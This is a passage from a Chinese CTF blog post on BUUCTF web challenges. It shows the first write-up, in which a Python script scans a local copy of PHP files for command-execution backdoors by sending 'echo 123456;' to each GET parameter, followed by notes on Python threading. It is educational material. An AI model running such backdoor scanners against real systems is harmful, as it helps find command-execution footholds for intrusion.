<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#00FFFF">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">





  <meta name="keywords" content="CTF," />










<meta name="description" content="BUU-web五 [强网杯2019]高明的客知识点：python脚本编写 [De1CTF 2019]SSRF Me知识点：python代码审计 [RoarCTF 2019]Easy Java知识点：WEB-INF&#x2F;web.xml泄露 [SUCTF 2019]Pythonginx知识点：python代码审计 [ASIS 2019]Unicom shop知识点：Unicode [SWPU2019]We">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="BUU-web五">
<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;index.html">
<meta property="og:site_name" content="CyzCc&#39;s blog">
<meta property="og:description" content="BUU-web五 [强网杯2019]高明的客知识点：python脚本编写 [De1CTF 2019]SSRF Me知识点：python代码审计 [RoarCTF 2019]Easy Java知识点：WEB-INF&#x2F;web.xml泄露 [SUCTF 2019]Pythonginx知识点：python代码审计 [ASIS 2019]Unicom shop知识点：Unicode [SWPU2019]We">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589348343688.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589348680619.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589348733665.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589364526094.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589377704993.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589358734581.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589354082674.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589357192899.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589357431885.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589358183429.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589358383231.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589361523563.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589361571235.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589361940703.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589362044015.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589362074667.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589417297060.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589417919436.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589418249241.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589420089124.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589423476236.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589423527287.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589423780836.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589429462137.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589429509486.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589437665830.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589437970774.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589438257604.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589438303461.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589438533575.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589442650477.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589444923161.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589445294546.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589445341991.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589448078427.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589448279978.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589448620761.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589511716452.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589512570530.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589512914689.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589528322044.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589528370798.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589533565181.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589552461509.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589552523480.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589590508788.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589591086671.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589596932895.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589596970844.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589597199043.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589597718976.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589597781687.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589600193445.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589600318291.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589612427990.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589612627542.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589612776280.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589612930582.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589613745642.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589613814849.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589618257419.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589619733626.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589619779798.png">
<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589620353999.png">
<meta property="og:updated_time" content="2020-06-25T12:12:13.501Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;16&#x2F;BUU-web5&#x2F;1589348343688.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://cyzcc.vip/2020/05/16/BUU-web5/"/>




<!--留言-->

  <script>
  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
  daovoice('init', {
      app_id: "9e261f4f"
    });
  daovoice('update');
  </script>


  <title>BUU-web五 | CyzCc's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">CyzCc's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-主页|随笔">
          <a href="/home/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            主页|随笔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-一些知识点">
          <a href="/guestbook/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
            
            一些知识点
          </a>
        </li>
      
        
        <li class="menu-item menu-item-关于我">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于我
          </a>
        </li>
      
        
        <li class="menu-item menu-item-分类">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-归档">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-links">
          <a href="/links/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
            
            友链
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>


 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/05/16/BUU-web5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="CyzCc">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CyzCc's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">BUU-web五</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-16T17:16:54+08:00">
                2020-05-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2020/05/16/BUU-web5/" class="leancloud_visitors" data-flag-title="BUU-web五">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  9.6k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  46
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><strong>BUU-web五</strong></p>
<p><strong>[强网杯2019]高明的客</strong><br>知识点：python脚本编写</p>
<p><strong>[De1CTF 2019]SSRF Me</strong><br>知识点：python代码审计</p>
<p><strong>[RoarCTF 2019]Easy Java</strong><br>知识点：WEB-INF/web.xml泄露</p>
<p><strong>[SUCTF 2019]Pythonginx</strong><br>知识点：python代码审计</p>
<p><strong>[ASIS 2019]Unicom shop</strong><br>知识点：Unicode</p>
<p><strong>[SWPU2019]Webl</strong><br>知识点：无列名注入</p>
<p><strong>[CISCN 2019 ]Love Math</strong><br>知识点：函数回转</p>
<p><strong>[BJDCTF2020]The mysteryofip</strong><br>知识点：xxf头处smarty模板注入payload</p>
<p><strong>[BJDCTF2020]Cookie is so stable</strong><br>知识点：Twig模板注入</p>
<p><strong>[GWCTF 2019]枯燥的抽奖</strong><br>知识点：php伪随机数漏洞</p>
<p><strong>[V&amp;N2020公开赛]HappyCTFd</strong><br>知识点：逻辑漏洞</p>
<p><strong>[极客大挑战2019]RCE ME</strong><br>知识点：绕过disable_function</p>
<p><strong>[SUCTF 2019]EasyWeb</strong><br>知识点：exif_imagetype()绕过、open_basedir绕过、异或绕过正则、使用python上传文件</p>
<p><strong>[GYCTF2020]FlaskApp</strong><br>知识点：模板注入，读取PIN码拿shell</p>
<p><strong>[HITCON 2017]SSRFme</strong><br>知识点：GET的命令执行漏洞</p>
<a id="more"></a>

<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p><img src="/2020/05/16/BUU-web5/1589348343688.png" alt="1589348343688"></p>
<p>将网站源码下载下来，发现有很多PHP文件<br><img src="/2020/05/16/BUU-web5/1589348680619.png" alt="1589348680619"></p>
<p>通过全局搜索可以发现许多后门，但是很多都不能利用<br><img src="/2020/05/16/BUU-web5/1589348733665.png" alt="1589348733665"></p>
<p>这里需要写个脚本批量扫描一 _GET 和 _POST，通过传入一些命令看其是否执行，例如echo 123456；<br>由于要执行命令，所以要将文件部署在本地PHP环境中</p>
<h2 id="普通脚本"><a href="#普通脚本" class="headerlink" title="普通脚本"></a>普通脚本</h2><p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">'D:/phpstudy_pro/wamp64/www/src/'</span>)    <span class="comment">#获取路径下的所有文件</span></span><br><span class="line">reg = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)   <span class="comment">#设置正则</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                <span class="comment">#从第一个文件开始</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1/src/"</span> + i</span><br><span class="line">    f = open(<span class="string">"D:/phpstudy_pro/wamp64/www/src/"</span>+i)        <span class="comment">#打开这个文件</span></span><br><span class="line">    data = f.read()           <span class="comment">#读取文件内容</span></span><br><span class="line">    f.close()                 <span class="comment">#关闭文件</span></span><br><span class="line">    result = reg.findall(data)  <span class="comment">#从文件中找到GET请求</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> result:           <span class="comment">#从第一个GET参数开始</span></span><br><span class="line">        payload = url + <span class="string">"?"</span> + j + <span class="string">"=echo 123456;"</span>   <span class="comment">##尝试请求次路径，并执行命令</span></span><br><span class="line">        print(payload)</span><br><span class="line">        html = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"123456"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            print(<span class="string">"成功发现后门："</span>+payload)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这个跑的十分的慢<br><img src="/2020/05/16/BUU-web5/1589364526094.png" alt="1589364526094"></p>
<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>使用多线程写将快得多，这里也学习一下别人的脚本，学习一下多线程顺便提高一下自己的编程能力</p>
<p>脚本涉及的一些函数</p>
<blockquote>
<ol>
<li><p><strong>time相关</strong></p>
<blockquote>
<p><strong>1.time.asctime()函数</strong><br>Python time asctime() 函数接受时间元组并返回一个可读的形式为”Tue Dec 11 18:07:14 2008”（2008年12月11日 周二18时07分14秒）的24个字符的字符串。<br>示例:</p>
</blockquote>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(time.asctime())</span><br><span class="line"><span class="comment"># Tue Apr 14 22:42:08 2020</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>2.time.localtime()函数</strong><br>描述：<br>Python time localtime() 函数类似gmtime()，作用是格式化时间戳为本地的时间。 如果sec参数未输入，则以当前时间为转换标准。 DST (Daylight Savings Time) flag (-1, 0 or 1) 是否是夏令时。 示例：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(time.localtime())</span><br><span class="line"><span class="comment"># time.struct_time(tm_year=2020, tm_mon=4, tm_mday=14, tm_hour=22, tm_min=37, tm_sec=13, tm_wday=1, tm_yday=105, tm_isdst=0)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>3.time.time()函数</strong><br>描述：<br>Python time time() 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(time.time())</span><br><span class="line"><span class="comment"># 1586875436.7926576</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p><strong>线程</strong></p>
</li>
<li><p><strong>threading.Thread()函数基本语法</strong></p>
</li>
</ol>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mthread = threading.<span class="constructor">Thread(<span class="params">target</span>=<span class="params">function_name</span>, <span class="params">args</span>=(<span class="params">function_parameter1</span>, <span class="params">function_parameterN</span>)</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>threading.Semaphore()函数</strong></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">学习博客：https://blog.csdn.net/a349458532/article/details/<span class="number">51589460</span></span><br><span class="line">线程的概念:</span><br><span class="line">线程，有时被称为轻量级进程(Lightweight Process，LWP），是程序执行流的最小单元。一个标准的线程由线程ID，当前指令指针(PC），寄存器集合和堆栈组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。</span><br><span class="line"></span><br><span class="line">                                                                       <span class="number">1.</span> 基本介绍</span><br><span class="line">Semaphore 在内部管理着一个计数器。调用 acquire() 会使这个计数器 <span class="number">-1</span>，release() 则是+<span class="number">1.</span>计数器的值永远不会小于 <span class="number">0</span>，当计数器到 <span class="number">0</span> 时，再调用 acquire() 就会阻塞，直到其他线程来调用release()</span><br><span class="line"></span><br><span class="line">                                                                       <span class="number">2.</span> acquire(blocking=<span class="literal">True</span>,timeout=<span class="literal">None</span>)</span><br><span class="line">本方法用于获取 Semaphore</span><br><span class="line">当使用默认参数调用本方法时：如果内部计数器的值大于零，将之减一，并返回；如果等于零，则阻塞，并等待其他线程调用 release() 方法以使计数器为正。这个过程有严格的互锁机制控制，以保证如果有多条线程正在等待解锁，release() 调用只会唤醒其中一条线程。唤醒哪一条是随机的。本方法返回 <span class="literal">True</span>，或无限阻塞</span><br><span class="line">如果 blocking=<span class="literal">False</span>，则不阻塞，但若获取失败的话，返回 <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                                                                       <span class="number">3.</span> release()</span><br><span class="line">释放 Semaphore，给内部计数器 +<span class="number">1</span>，可以唤醒处于等待状态的线程</span><br><span class="line">脚本中的 threading.Semaphore(<span class="number">100</span>) 是指同时最多有一百个线程运行</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>os.chdir()</strong></li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">描述:</span><br><span class="line"><span class="selector-tag">os</span><span class="selector-class">.chdir</span>() 方法用于改变当前工作目录到指定的路径。</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>os.listdir()</strong></li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">os</span><span class="selector-class">.listdir</span>() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>基本思路：</p>
<blockquote>
<p>依次打开文件，匹配里面所有的$_GET[]和$_POST，然后通过传入命令<code>echo 123456;</code>在返回的页<br>面中匹配123456来判断是否执行</p>
</blockquote>
